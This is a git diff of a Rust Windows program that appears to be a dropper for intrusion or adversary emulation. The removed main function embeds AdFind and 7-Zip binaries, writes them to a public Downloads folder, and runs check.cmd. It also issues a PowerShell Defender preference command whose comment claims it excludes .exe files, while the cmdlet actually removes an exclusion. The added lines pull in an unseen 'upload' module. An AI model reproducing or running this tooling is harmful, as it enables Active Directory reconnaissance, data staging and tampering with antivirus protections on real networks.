@@ -4,6 +4,8 @@
 #![allow(unused_imports)]
 #![allow(dead_code)]
 
+mod upload;
+
 use std::env;
 use std::path::PathBuf;
 use std::process::Command;
@@ -16,11 +18,16 @@ use winreg::enums::*;
 use std::fs::File;
 use std::io::Write;
 
+
+
+use std::io::Read;
+use std::string::String;
+
 mod tools {
 
-    use RegKey;
-    use HKEY;
-    use Command;
+    use winreg::RegKey;
+    use winreg::HKEY;
+    use std::process::Command;
 
     /*
     Execute an executable with a commandline
@@ -105,32 +112,7 @@ mod tools {
 
 
 
-
 fn main() {
-    let dropzone = r"C:\Users\Public\Downloads\";
 
-    //Adfind tools
-    let adfind_bin = include_bytes!("payload/AdFind.bin");
-    let adfind_cmd = include_str!("payload/adfind.cmd");
-    
-    //7zip
-    let  sevenzip_a = include_bytes!("payload/7zip/7za.dll");
-    let  sevenzip_xa = include_bytes!("payload/7zip/7zxa.dll");
-    let  sevenzip_exe = include_bytes!("payload/7zip/7za.exe");
-
-    // exclude exe from defender
-    tools::run_exe("powershell", "Remove-MpPreference -ExclusionExtension .exe");
-    
-    //let make a scope to close the file :)
-    {
-        File::create(format!("{}{}",dropzone,"find.exe")).expect("Oups").write_all(adfind_bin).unwrap();
-        File::create(format!("{}{}",dropzone,"check.cmd")).expect("Oups").write_all( adfind_cmd.as_bytes()).unwrap();
-        File::create(format!("{}{}",dropzone,"7za.dll")).expect("Oups").write_all(sevenzip_a).unwrap();
-        File::create(format!("{}{}",dropzone,"7zxa.dll")).expect("Oups").write_all(sevenzip_xa).unwrap();
-        File::create(format!("{}{}",dropzone,"7za.exe")).expect("Oups").write_all(sevenzip_exe).unwrap();
-    }
-
-    //    tools::run_exe("cmd", &format!("/C {}{}",dropzone,"check.cmd"))
-    Command::new("cmd").current_dir(dropzone).args(["/C","check.cmd"]).spawn().expect("Oups");
 
 }
